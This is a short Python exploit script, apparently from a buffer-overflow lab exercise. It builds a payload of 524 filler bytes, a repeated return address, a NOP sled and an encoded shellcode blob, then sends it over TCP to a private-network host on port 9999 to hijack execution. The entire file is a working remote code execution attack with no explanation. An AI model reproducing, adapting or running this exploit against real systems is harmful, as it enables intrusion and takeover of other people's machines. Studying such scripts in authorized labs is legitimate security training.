#!/usr/bin/python
import socket
import time
import sys

try:
    print("\n[+] Send evil buffer ")

    badchars = '\x00'
    shellcode = ("\xb8\x7b\xd2\x2f\x2c\xda\xc3\xd9\x74\x24\xf4\x5f\x2b\xc9"
                 "\xb1\x52\x31\x47\x12\x03\x47\x12\x83\xbc\xd6\xcd\xd9\xbe"
                 "\x3f\x93\x22\x3e\xc0\xf4\xab\xdb\xf1\x34\xcf\xa8\xa2\x84"
                 "\x9b\xfc\x4e\x6e\xc9\x14\xc4\x02\xc6\x1b\x6d\xa8\x30\x12"
                 "\x6e\x81\x01\x35\xec\xd8\x55\x95\xcd\x12\xa8\xd4\x0a\x4e"
                 "\x41\x84\xc3\x04\xf4\x38\x67\x50\xc5\xb3\x3b\x74\x4d\x20"
                 "\x8b\x77\x7c\xf7\x87\x21\x5e\xf6\x44\x5a\xd7\xe0\x89\x67"
                 "\xa1\x9b\x7a\x13\x30\x4d\xb3\xdc\x9f\xb0\x7b\x2f\xe1\xf5"
                 "\xbc\xd0\x94\x0f\xbf\x6d\xaf\xd4\xbd\xa9\x3a\xce\x66\x39"
                 "\x9c\x2a\x96\xee\x7b\xb9\x94\x5b\x0f\xe5\xb8\x5a\xdc\x9e"
                 "\xc5\xd7\xe3\x70\x4c\xa3\xc7\x54\x14\x77\x69\xcd\xf0\xd6"
                 "\x96\x0d\x5b\x86\x32\x46\x76\xd3\x4e\x05\x1f\x10\x63\xb5"
                 "\xdf\x3e\xf4\xc6\xed\xe1\xae\x40\x5e\x69\x69\x97\xa1\x40"
                 "\xcd\x07\x5c\x6b\x2e\x0e\x9b\x3f\x7e\x38\x0a\x40\x15\xb8"
                 "\xb3\x95\xba\xe8\x1b\x46\x7b\x58\xdc\x36\x13\xb2\xd3\x69"
                 "\x03\xbd\x39\x02\xae\x44\xaa\xed\x87\xec\xa7\x86\xd5\xf0"
                 "\xb6\xed\x53\x16\xd2\x01\x32\x81\x4b\xbb\x1f\x59\xed\x44"
                 "\x8a\x24\x2d\xce\x39\xd9\xe0\x27\x37\xc9\x95\xc7\x02\xb3"
                 "\x30\xd7\xb8\xdb\xdf\x4a\x27\x1b\xa9\x76\xf0\x4c\xfe\x49"
                 "\x09\x18\x12\xf3\xa3\x3e\xef\x65\x8b\xfa\x34\x56\x12\x03"
                 "\xb8\xe2\x30\x13\x04\xea\x7c\x47\xd8\xbd\x2a\x31\x9e\x17"
                 "\x9d\xeb\x48\xcb\x77\x7b\x0c\x27\x48\xfd\x11\x62\x3e\xe1"
                 "\xa0\xdb\x07\x1e\x0c\x8c\x8f\x67\x70\x2c\x6f\xb2\x30\x5c"
                 "\x3a\x9e\x11\xf5\xe3\x4b\x20\x98\x13\xa6\x67\xa5\x97\x42"
                 "\x18\x52\x87\x27\x1d\x1e\x0f\xd4\x6f\x0f\xfa\xda\xdc\x30"
                 "\x2f"
                 )

    buffer = b'A' * 524 + b'\xf3\x12\x17\x31' * 4 +  b'\x90' * 10 + bytes(shellcode)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.170.141", 9999))
    s.send(buffer)
    s.close()

    time.sleep(3)

except:
    print("\n[+] Failed to connect.")
    sys.exit()
